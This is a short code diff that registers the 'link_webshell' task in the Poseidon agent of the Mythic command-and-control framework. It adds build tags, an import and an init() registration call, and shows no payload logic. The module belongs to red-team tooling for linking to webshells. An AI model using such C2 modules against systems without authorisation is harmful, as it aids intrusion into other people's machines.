@@ -1,3 +1,5 @@
+//go:build (linux || darwin) && (link_webshell || debug)
+
 package link_webshell
 
 import (
@@ -5,13 +7,19 @@ import (
 
 	"encoding/base64"
 	"encoding/json"
+
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
 
 	// Poseidon
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("link_webshell", Run)
+}
 
 type Arguments struct {
 	CookieValue string
